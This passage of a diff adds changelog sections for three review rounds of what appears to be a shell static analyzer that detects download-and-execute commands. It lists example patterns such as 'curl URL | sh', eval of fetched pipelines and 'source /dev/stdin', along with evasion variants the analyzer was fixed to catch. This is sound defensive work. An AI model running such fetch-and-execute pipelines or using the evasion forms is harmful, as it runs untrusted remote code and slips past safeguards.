+scripts/determinism-canary.sh                            # exit 0
+```
+
+## v0.2.1 H3 — Review Response (ninth round, five analysis-model refinements and one depth-accounting fix)
+
+Status: **complete**
+
+Ninth-pass review found six issues against the eighth round: two
+false-High/false-negative pairs from one boolean, a consumer false
+positive, a false negative, a wrapper gap, and a budget accounting
+defect.
+
+1. **Producer stdout was one compound-wide boolean (P1).**
+   `(curl URL >/tmp/body; echo safe) | sh` falsely emitted High while
+   `(curl URL; echo safe >/tmp/log) | sh` missed it — only the final
+   command's redirect was inspected. Producer pairing is now per command
+   site (`segment_has_live_producer`): a compound's own depth-zero
+   redirect starves every site inside, each inner command's redirect
+   starves only that command, short-circuited statements own no live
+   sites, and intermediate segments must pass the body through
+   (`segment_stdout_preserved` — plain segments keep the long-standing
+   no-redirect rule; compound segments forward only when a statement
+   reads the live pipe and emits it unredirected). The span checks
+   (`eval "$( … )"`) migrated to the same site model.
+2. **Interpreter identity implied stdin execution (P1).**
+   `curl URL | sh -c 'echo safe'` and `curl URL | sh
+   /tmp/local-script.sh` emitted High although the shell executes the
+   body or file instead of the pipe. `command_reads_stdin_script` now
+   reads interpreter arguments: a `-c` body (glued or separate) or a
+   script-file operand means stdin is not executed, while `-s` (sh
+   family), a bare `-` operand, or no arguments at all keep the pipe
+   live (`curl URL | sh -s`, `| bash -s --`, `| python3`, `| sh -` still
+   fire).
+3. **Conditional lists executed every statement (P1).**
+   `statement_segments` discarded whether a boundary was `&&`, `||`, or
+   `;`, so `curl URL | (false && cat >/dev/null; sh)` missed High — the
+   model let `cat` drain a pipe it never reads because bash skips it.
+   `conditional_statements` preserves the control operator and a
+   three-value outcome model (`true`/`:` succeed, `false` fails,
+   everything else keeps both branches executable) gates every walk:
+   the consumer stdin walk, the intermediate-forward walk, producer
+   sites, the consumption families, the egress walk, and the consumed-
+   span checks. `false && curl URL | sh` no longer records egress or
+   High either; `false || cat` still drains because it really runs.
+4. **Arithmetic command groups skipped their substitutions (P1).**
+   `(( $(curl URL | sh) + 1 ))` recorded network access but no High —
+   the group recursion only descended into List groups. Arithmetic
+   interiors now run the substitution-only consumption walk
+   (`tokens_arithmetic_consumption`), the same walk `$(( … ))` expansion
+   tokens use, so a nested command substitution's pipeline fires.
+5. **GNU time's valued short options were unreadable (P1).**
+   `/usr/bin/time -f '%e' curl URL | sh` selected `%e` as the wrapped
+   command; `-o FILE` lost the command the same way. `-f` and `-o` join
+   `--format`/`--output` as valued options; `-a`/`--append` stays a
+   flag.
+6. **Arithmetic expansions charged depth twice (P2).**
+   `arithmetic_consumption_findings` entered once at entry and again
+   before dispatching each nested substitution, so arithmetic levels
+   cost two depth units and a valid 40-level expression ending in
+   `$(curl URL | sh | wc -c)` missed High. Each recursive helper now
+   owns its single charge, and the egress and consumption traversals of
+   a line each get their own budget instead of sharing one depth
+   account across two walks of the same tree.
+
+Tests: six new regressions pin the confirmed cases
+(`compound_producer_stdout_tracks_its_command`,
+`interpreter_stdin_mode_is_argument_sensitive`,
+`conditional_lists_gate_stdin_consumption`,
+`arithmetic_command_groups_analyze_nested_substitutions`,
+`time_valued_short_options_reach_the_wrapped_command`,
+`deep_arithmetic_nesting_stays_within_the_depth_budget` with the
+40-level no-limitation positive). Full verification re-run:
+
+```text
+cargo fmt --all -- --check
+cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
+cargo test --workspace                                   # 170 analyzer (parser) / 160 (lexical)
+./scripts/generate-cli-assets.sh --check                 # exit 0
+scripts/determinism-canary.sh                            # exit 0
+```
+
+## v0.2.1 H3 — Review Response (tenth round, four pipeline-boundary refinements, one outcome-model gap, and one option-parsing fix)
+
+Status: **complete**
+
+Tenth-pass review found six issues against the ninth round: five
+pipeline/stdin-model false positives and false negatives around
+compound interiors, intermediates, and option parsing, plus two
+conditional-outcome defects and an ungated egress recursion.
+
+1. **A producer's own inner pipeline was unchecked (P1).**
+   `(curl URL | cat >/dev/null) | sh` emitted High — inside a compound,
+   any live producer site was accepted without following its output
+   through the rest of its nested pipeline. Producer pairing now draws
+   the boundary at the enclosing context (`pipeline_has_live_producer`):
+   a site counts only when its stdout survives every remaining segment
+   of its own pipeline to become the compound's stdout, and the
+   executed-span checks (`eval "$(curl URL | cat >/dev/null)"`) use the
+   same test, where the boundary is the substitution's collected output.
+2. **Every plain intermediate stage read as forwarding (P1).**
+   `curl URL | echo safe | sh` emitted High because a plain stage kept
+   the long-standing no-redirect rule. Plain stages now require the
+   same known-forwarding model compound stages use
+   (`segment_stdin_behavior`): `echo`, `true`, `wc`, and `xargs` (which
+   spends the pipe on child argv) stop the body, while `cat`, `sed`,
+   `tee`, `gzip -d`, `xxd -r`, and `openssl enc -d` (joined to the
+   drain set) pass it on. The forward/drain split also corrects the
+   compound walk: drainers that emit derived output no longer count as
+   forwarding it.
+3. **One guarded outcome overwrote the alternate path (P1).**
+   `printf ok || false && curl URL | sh` runs the fetch in bash, but the
+   single-value outcome model executed `false`, stored Failure, and
+   skipped the fetch. The model now tracks the SET of possible statuses
+   (`Outcomes`): a guarded statement that may run contributes its own
+   outcomes to the executed paths while skipped paths keep theirs, and
+   a guard admits a statement when any live path lets it through.
+4. **Pipeline negation was invisible to the outcome model (P1).**
+   `! true` modelled as Success because `segment_commands` strips the
+   leading `!`, so `! true || curl URL | sh` missed both egress and
+   High. `statement_outcomes` detects the `!` reserved word opening the
+   pipeline and inverts known statuses (`! true` fails, `! false`
+   succeeds, double negation counts parity); unknown stays unknown.
+5. **Egress recursion ignored conditional guards (P2).**
+   `(false && curl URL)` recorded NetworkAccess — the top-level walk
+   honored guards, but group lookup (`group_contains_command`) and the
+   final flat substitution scan examined every token regardless of
+   execution. Egress now walks each executed statement recursively:
+   list-group interiors keep their guards at every nesting level, and
+   depth-0 substitutions are scanned only where the statement actually
+   runs (`executed_list_fetch_egress`).
+6. **Interpreter options were matched by substring (P1).**
+   `bash --norc` missed High because any option text containing `c` read
+   as `-c`, and `python3 -W ignore` read `ignore` as a script file.
+   `command_reads_stdin_script` parses options exactly per family:
+   shell clusters handle `-c`/`-s`/`-o` (glued or separate) and `+`
+   set-options, long options are classified (`--norc` a flag,
+   `--rcfile` valued, `--help`/`--version` exit-before-stdin), and
+   python `-c`/`-m` replace stdin while `-W`/`-X` consume a glued or
+   separate value.
+
+Tests: six new regressions pin the confirmed cases
+(`compound_producer_survives_its_inner_pipeline`,
+`plain_intermediates_forward_only_known_filters`,
+`conditional_outcomes_merge_executed_and_skipped_paths`,
+`pipeline_negation_inverts_known_outcomes`,
+`egress_stays_inside_executed_branches`,
+`interpreter_options_parse_by_arity`). Full verification re-run:
+
+```text
+cargo fmt --all -- --check
+cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
+cargo test --workspace                                   # 176 analyzer (parser) / 166 (lexical)
+./scripts/generate-cli-assets.sh --check                 # exit 0
+scripts/determinism-canary.sh                            # exit 0
+```
+
+## v0.2.1 H3 — Review Response (eleventh round, opaque bodies, blind modes, missing stdin-code consumers, and physical-line analysis)
+
+Status: **complete**
+
+Eleventh-pass review found six issues against the tenth round, all
+about text the analyzer treated as opaque or read at the wrong
+granularity. The fixes follow the suggested shared abstractions:
+structured interpreter modes, a recursive static-body summary, explicit
+stdin-code consumers, mode-sensitive transformers, and logical-command
+assembly.
+
+1. **Literal `-c` bodies were opaque (P1).**
+   `sh -c 'curl URL | sh'`, `sh -c 'curl URL' | sh`, and
+   `curl URL | sh -c sh` all missed High — returning false for `-c`
+   ended the analysis. Words now carry a `dynamic` flag (an unquoted or
+   double-quoted `$`/backtick expansion or a captured substitution makes
+   the word runtime-derived), and `ScriptCommand` mirrors it per
+   argument, so a `-c` body is recognized as statically known text and
+   reparsed through `ShellSummary`: the body's own pipeline fires the
+   families, a body producing fetch output (`curl URL` inside) becomes
+   a producer site for a downstream interpreter, and a body that
+   executes inherited stdin as code (`sh -c sh`) pairs with the pipe.
+   Runtime-derived bodies (`sh -c "$text"`) stay outside the static
+   slice.
+2. **Literal eval programs were not analyzed (P1).**
+   `eval 'curl URL | sh'` executed the pipeline but recorded nothing.
+   Static eval argument text (joined the way eval concatenates its
+   arguments) now reparses as an executed shell body in the egress walk
+   and in every consumption family; dynamic arguments remain outside
+   the slice.
+3. **Interpreter option parsing still changed semantics (P1).**
+   `bash -O extglob` and `python3 -Ximporttime` missed High because
+   option payload letters read as modes (`-Ximporttime` contains `m`),
+   while `bash -n` and `python3 -h` emitted High without executing
+   stdin. Both families are now walked letter by letter with arity
+   parsed as we go: `-c` bodies are glued or separate, `-o`/`-O` and
+   `-W`/`-X` consume a glued-or-separate value, `-n` is a parse-only
+   read and `-h`/`-V`/`-D`/`--help`/`--version`/`--check` exit before
+   stdin, and after `--` only the FIRST operand selects the script, so
+   later words are positional parameters (`sh -- - arg` follows the
+   POSIX operand rule the review specified).
+4. **Transformer forwarding was mode-blind (P1).**
+   `base64`, `base32`, `xxd`, and `gzip` forwarded the body in every
+   mode, so `curl URL | base64 | sh` falsely emitted High, while `dd
+   status=none` — a verbatim copier — was missed. Forwarding is now
+   per command: base64/base32 only with `-d`/`-D`/`--decode`, xxd only
+   with `-r`, gzip only decompressing, openssl only its decode forms,
+   and `dd` only as a plain KEY=VALUE copier with no `if=`/`of=`/
+   `conv=`/`skip=`/`count=`/block-size operands (which also gates
+   whether it drains).
+5. **Non-direct stdin code consumers evaded pairing (P1).**
+   `source /dev/stdin` (and `.`), `eval "$(cat)"`, and
+   `curl URL | xargs sh -c` execute remote-derived input but produced
+   no High. `segment_reaches_interpreter` now recognizes explicit
+   stdin-to-code consumers: source/dot reading `/dev/stdin` or
+   `/dev/fd/0`, a substitution whose interior executes stdin as code
+   (`echo "$(sh)"`) or — under an `eval` head — merely forwards it to
+   the executed text (`eval "$(cat)"`), and `xargs` feeding an
+   interpreter whose `-c` body is missing or references the positional
+   parameters; a fixed body (`xargs sh -c 'echo safe'`) stays silent.
+6. **Raw-line scanning missed multiline pipelines (P1).**
+   `curl URL \` + `| sh` and the grammar continuation `curl URL |` +
+   `sh` recorded egress but missed download-execute because each
+   physical line tokenized alone. `shell_logical_units` now assembles
+   shell logical commands across escaped newlines (removed, no byte
+   inserted), trailing `|`/`|&`/`&&`/`||`, and open quotes, backticks,
+   or `(`/`{` groups, applying `#` comments statefully along the way
+   (a comment swallows its line's backslash continuation). Each unit
+   keeps its starting line for findings; Python keeps its per-line
+   scan.
+
+Tests: six new regressions pin the confirmed cases
+(`literal_c_bodies_are_analyzed`, `static_eval_arguments_execute`,
+`interpreter_mode_reads_arity_exits_and_noexec`,
+`transformer_forwarding_is_mode_sensitive`,
+`stdin_code_consumers_pair_with_producers`,
+`logical_units_join_multiline_pipelines`), and the shell strip-comment
+unit assertions moved to `shell_logical_units`. Full verification
+re-run:
+
+```text
+cargo fmt --all -- --check
+cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
+cargo test --workspace                                   # 182 analyzer (parser) / 172 (lexical)
+./scripts/generate-cli-assets.sh --check                 # exit 0
+scripts/determinism-canary.sh                            # exit 0
+```
